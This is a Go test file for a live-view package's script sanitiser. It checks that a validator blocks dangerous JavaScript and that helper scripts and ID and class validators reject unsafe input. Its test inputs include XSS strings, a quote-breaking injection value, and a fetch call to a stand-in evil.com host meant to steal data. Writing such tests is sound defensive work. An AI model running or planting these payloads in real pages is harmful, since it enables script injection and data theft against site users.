package liveview

import (
	"strings"
	"testing"
)

func TestNewSafeScript(t *testing.T) {
	tests := []struct {
		name    string
		code    string
		config  *SafeScriptConfig
		wantErr bool
		errMsg  string
	}{
		{
			name:    "Valid console.log",
			code:    "console.log('test');",
			config:  DefaultSafeScriptConfig(),
			wantErr: false,
		},
		{
			name:    "Valid setTimeout",
			code:    "setTimeout(function() { console.log('delayed'); }, 1000);",
			config:  DefaultSafeScriptConfig(),
			wantErr: false,
		},
		{
			name:    "Block eval",
			code:    "eval('alert(1)');",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block Function constructor",
			code:    "new Function('alert(1)')();",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block innerHTML",
			code:    "document.getElementById('test').innerHTML = '<script>alert(1)</script>';",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block document.write",
			code:    "document.write('<script>alert(1)</script>');",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block cookie access",
			code:    "document.cookie = 'test=value';",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block localStorage",
			code:    "localStorage.setItem('key', 'value');",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block fetch",
			code:    "fetch('https://evil.com/steal-data');",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block XMLHttpRequest",
			code:    "new XMLHttpRequest().open('GET', 'https://evil.com');",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name: "Exceeds max length",
			code: strings.Repeat("a", 1001),
			config: &SafeScriptConfig{
				MaxScriptLength:  1000,
				AllowedFunctions: []string{},
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "Block script tag",
			code:    "var x = '<script>alert(1)</script>';",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block javascript: protocol",
			code:    "window.location = 'javascript:alert(1)';",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Block event handlers",
			code:    "element.onclick = function() { alert(1); };",
			config:  DefaultSafeScriptConfig(),
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "Allow safe DOM manipulation",
			code:    "document.getElementById('test').classList.add('active');",
			config:  DefaultSafeScriptConfig(),
			wantErr: false,
		},
		{
			name:    "Allow element focus",
			code:    "document.getElementById('input').focus();",
			config:  DefaultSafeScriptConfig(),
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script, err := NewSafeScript(tt.code, tt.config)
			
			if tt.wantErr {
				if err == nil {
					t.Errorf("NewSafeScript() expected error but got none")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("NewSafeScript() error = %v, want error containing %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("NewSafeScript() unexpected error = %v", err)
				}
				if script == nil {
					t.Errorf("NewSafeScript() returned nil script")
				} else if script.GetCode() != tt.code {
					t.Errorf("NewSafeScript() code = %v, want %v", script.GetCode(), tt.code)
				}
			}
		})
	}
}

func TestPredefinedScripts(t *testing.T) {
	ps := &PredefinedScripts{}

	t.Run("ScrollToTop", func(t *testing.T) {
		script := ps.ScrollToTop()
		if script == nil {
			t.Error("ScrollToTop() returned nil")
		}
		if !strings.Contains(script.GetCode(), "scrollTo") {
			t.Error("ScrollToTop() script doesn't contain scrollTo")
		}
	})

	t.Run("ScrollToElement valid", func(t *testing.T) {
		script, err := ps.ScrollToElement("test-element")
		if err != nil {
			t.Errorf("ScrollToElement() unexpected error = %v", err)
		}
		if script == nil {
			t.Error("ScrollToElement() returned nil")
		}
		if !strings.Contains(script.GetCode(), "test-element") {
			t.Error("ScrollToElement() script doesn't contain element ID")
		}
		if !strings.Contains(script.GetCode(), "scrollIntoView") {
			t.Error("ScrollToElement() script doesn't contain scrollIntoView")
		}
	})

	t.Run("ScrollToElement invalid ID", func(t *testing.T) {
		invalidIDs := []string{
			"<script>",
			"'; alert(1); //",
			"element with spaces",
			strings.Repeat("a", 101),
		}
		
		for _, id := range invalidIDs {
			_, err := ps.ScrollToElement(id)
			if err == nil {
				t.Errorf("ScrollToElement(%q) expected error for invalid ID", id)
			}
		}
	})

	t.Run("FocusElement valid", func(t *testing.T) {
		script, err := ps.FocusElement("input-field")
		if err != nil {
			t.Errorf("FocusElement() unexpected error = %v", err)
		}
		if script == nil {
			t.Error("FocusElement() returned nil")
		}
		if !strings.Contains(script.GetCode(), "focus()") {
			t.Error("FocusElement() script doesn't contain focus()")
		}
	})

	t.Run("ToggleClass valid", func(t *testing.T) {
		script, err := ps.ToggleClass("element-id", "active")
		if err != nil {
			t.Errorf("ToggleClass() unexpected error = %v", err)
		}
		if script == nil {
			t.Error("ToggleClass() returned nil")
		}
		if !strings.Contains(script.GetCode(), "classList.toggle") {
			t.Error("ToggleClass() script doesn't contain classList.toggle")
		}
		if !strings.Contains(script.GetCode(), "active") {
			t.Error("ToggleClass() script doesn't contain class name")
		}
	})

	t.Run("ToggleClass invalid class", func(t *testing.T) {
		invalidClasses := []string{
			"<script>",
			"class with spaces",
			strings.Repeat("a", 51),
		}
		
		for _, class := range invalidClasses {
			_, err := ps.ToggleClass("element-id", class)
			if err == nil {
				t.Errorf("ToggleClass with class %q expected error", class)
			}
		}
	})

	t.Run("ShowAlert valid", func(t *testing.T) {
		script, err := ps.ShowAlert("Test message")
		if err != nil {
			t.Errorf("ShowAlert() unexpected error = %v", err)
		}
		if script == nil {
			t.Error("ShowAlert() returned nil")
		}
		if !strings.Contains(script.GetCode(), "alert") {
			t.Error("ShowAlert() script doesn't contain alert")
		}
		if !strings.Contains(script.GetCode(), "Test message") {
			t.Error("ShowAlert() script doesn't contain message")
		}
	})

	t.Run("ShowAlert escapes quotes", func(t *testing.T) {
		script, err := ps.ShowAlert("Test's message")
		if err != nil {
			t.Errorf("ShowAlert() unexpected error = %v", err)
		}
		if strings.Contains(script.GetCode(), "Test's") {
			t.Error("ShowAlert() didn't escape single quote")
		}
		if !strings.Contains(script.GetCode(), "Test\\'s") {
			t.Error("ShowAlert() should contain escaped quote")
		}
	})

	t.Run("ShowAlert too long", func(t *testing.T) {
		longMessage := strings.Repeat("a", 201)
		_, err := ps.ShowAlert(longMessage)
		if err == nil {
			t.Error("ShowAlert() expected error for long message")
		}
	})
}

func TestIsValidElementID(t *testing.T) {
	tests := []struct {
		id    string
		valid bool
	}{
		{"test-element", true},
		{"test_element", true},
		{"testElement123", true},
		{"TEST", true},
		{"", false},
		{"test element", false},
		{"<script>", false},
		{"test'element", false},
		{"test;element", false},
		{strings.Repeat("a", 100), false},
		{strings.Repeat("a", 99), true},
	}

	for _, tt := range tests {
		t.Run(tt.id, func(t *testing.T) {
			if got := isValidElementID(tt.id); got != tt.valid {
				t.Errorf("isValidElementID(%q) = %v, want %v", tt.id, got, tt.valid)
			}
		})
	}
}

func TestIsValidClassName(t *testing.T) {
	tests := []struct {
		className string
		valid     bool
	}{
		{"active", true},
		{"btn-primary", true},
		{"btn_primary", true},
		{"btn123", true},
		{"", false},
		{"btn primary", false},
		{"btn.primary", false},
		{"btn>primary", false},
		{strings.Repeat("a", 50), false},
		{strings.Repeat("a", 49), true},
	}

	for _, tt := range tests {
		t.Run(tt.className, func(t *testing.T) {
			if got := isValidClassName(tt.className); got != tt.valid {
				t.Errorf("isValidClassName(%q) = %v, want %v", tt.className, got, tt.valid)
			}
		})
	}
}

func TestRemoveStringsAndComments(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "Remove single-line comment",
			input:    "var x = 1; // This is a comment",
			expected: "var x = 1; ",
		},
		{
			name:     "Remove multi-line comment",
			input:    "var x = 1; /* This is\na comment */ var y = 2;",
			expected: "var x = 1;  var y = 2;",
		},
		{
			name:     "Remove double-quoted string",
			input:    `var x = "test string";`,
			expected: `var x = ;`,
		},
		{
			name:     "Remove single-quoted string",
			input:    `var x = 'test string';`,
			expected: `var x = ;`,
		},
		{
			name:     "Remove template literal",
			input:    "var x = `test string`;",
			expected: "var x = ;",
		},
		{
			name:     "Complex case",
			input:    `var x = "string"; // comment\n/* multi\nline */ console.log('test');`,
			expected: `var x = ;  console.log();`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := removeStringsAndComments(tt.input)
			// Normalize whitespace for comparison
			got = strings.TrimSpace(got)
			expected := strings.TrimSpace(tt.expected)
			if got != expected {
				t.Errorf("removeStringsAndComments() = %q, want %q", got, expected)
			}
		})
	}
}

func TestIsAllowedFunction(t *testing.T) {
	allowed := []string{
		"console.log",
		"document.getElementById",
		"element.focus",
	}

	tests := []struct {
		functionName string
		expected     bool
	}{
		{"console.log", true},
		{"console", true}, // Prefix match
		{"document.getElementById", true},
		{"document", true}, // Prefix match
		{"element.focus", true},
		{"setTimeout", true}, // Basic allowed
		{"Math.random", true}, // Basic allowed
		{"eval", false},
		{"Function", false},
		{"XMLHttpRequest", false},
		{"fetch", false},
		{"unknown.function", false},
	}

	for _, tt := range tests {
		t.Run(tt.functionName, func(t *testing.T) {
			if got := isAllowedFunction(tt.functionName, allowed); got != tt.expected {
				t.Errorf("isAllowedFunction(%q) = %v, want %v", tt.functionName, got, tt.expected)
			}
		})
	}
}

// TestComponent implements a minimal Component for testing
type TestComponent struct {
	Driver *ComponentDriver[*TestComponent]
}

func (tc *TestComponent) GetDriver() LiveDriver {
	return tc.Driver
}

func (tc *TestComponent) GetTemplate() string {
	return "<div>Test</div>"
}

func (tc *TestComponent) Start() {}

func TestComponentDriverExecuteSafeScript(t *testing.T) {
	// Create a test component driver
	driver := &ComponentDriver[*TestComponent]{
		channel: make(chan map[string]interface{}, 1),
	}

	t.Run("Execute valid script", func(t *testing.T) {
		script, err := NewSafeScript("console.log('test');", nil)
		if err != nil {
			t.Fatalf("Failed to create safe script: %v", err)
		}

		err = driver.ExecuteSafeScript(script)
		if err != nil {
			t.Errorf("ExecuteSafeScript() error = %v", err)
		}

		// Check if message was sent to channel
		select {
		case msg := <-driver.channel:
			if msg["type"] != "script" {
				t.Errorf("Expected type 'script', got %v", msg["type"])
			}
			if msg["safe"] != true {
				t.Errorf("Expected safe flag to be true")
			}
			if msg["value"] != script.GetCode() {
				t.Errorf("Expected value %q, got %q", script.GetCode(), msg["value"])
			}
		default:
			t.Error("No message sent to channel")
		}
	})

	t.Run("Execute nil script", func(t *testing.T) {
		err := driver.ExecuteSafeScript(nil)
		if err == nil {
			t.Error("ExecuteSafeScript(nil) expected error")
		}
	})
}

func TestComponentDriverExecutePredefinedAction(t *testing.T) {
	// Create a test component driver
	driver := &ComponentDriver[*TestComponent]{
		channel: make(chan map[string]interface{}, 1),
	}

	tests := []struct {
		name    string
		action  string
		params  []string
		wantErr bool
	}{
		{
			name:    "scrollTop",
			action:  "scrollTop",
			params:  []string{},
			wantErr: false,
		},
		{
			name:    "scrollToElement with valid ID",
			action:  "scrollToElement",
			params:  []string{"test-element"},
			wantErr: false,
		},
		{
			name:    "scrollToElement without ID",
			action:  "scrollToElement",
			params:  []string{},
			wantErr: true,
		},
		{
			name:    "focusElement with valid ID",
			action:  "focusElement",
			params:  []string{"input-field"},
			wantErr: false,
		},
		{
			name:    "toggleClass with valid params",
			action:  "toggleClass",
			params:  []string{"element-id", "active"},
			wantErr: false,
		},
		{
			name:    "toggleClass with missing params",
			action:  "toggleClass",
			params:  []string{"element-id"},
			wantErr: true,
		},
		{
			name:    "unknown action",
			action:  "unknownAction",
			params:  []string{},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := driver.ExecutePredefinedAction(tt.action, tt.params...)
			
			if tt.wantErr {
				if err == nil {
					t.Error("ExecutePredefinedAction() expected error")
				}
			} else {
				if err != nil {
					t.Errorf("ExecutePredefinedAction() unexpected error = %v", err)
				}
				
				// Check if message was sent to channel
				select {
				case msg := <-driver.channel:
					if msg["type"] != "script" {
						t.Errorf("Expected type 'script', got %v", msg["type"])
					}
					if msg["safe"] != true {
						t.Errorf("Expected safe flag to be true")
					}
				default:
					t.Error("No message sent to channel")
				}
			}
		})
	}
}

func TestDeprecatedEvalScript(t *testing.T) {
	// Create a test component driver
	driver := &ComponentDriver[*TestComponent]{
		channel: make(chan map[string]interface{}, 1),
	}

	t.Run("Valid script through deprecated method", func(t *testing.T) {
		driver.DeprecatedEvalScript("console.log('test');")
		
		// Check if message was sent to channel
		select {
		case msg := <-driver.channel:
			if msg["type"] != "script" {
				t.Errorf("Expected type 'script', got %v", msg["type"])
			}
			// Should still work for backward compatibility
			if msg["value"] != "console.log('test');" {
				t.Errorf("Script not sent correctly")
			}
		default:
			t.Error("No message sent to channel")
		}
	})

	t.Run("Dangerous script through deprecated method", func(t *testing.T) {
		// Even dangerous scripts should work for backward compatibility
		// but with deprecation warning logged
		driver.DeprecatedEvalScript("eval('alert(1)');")
		
		// Check if message was sent to channel
		select {
		case msg := <-driver.channel:
			if msg["type"] != "script" {
				t.Errorf("Expected type 'script', got %v", msg["type"])
			}
			// Should mark as deprecated
			if msg["deprecated"] != true {
				t.Errorf("Expected deprecated flag to be true")
			}
		default:
			t.Error("No message sent to channel")
		}
	})
}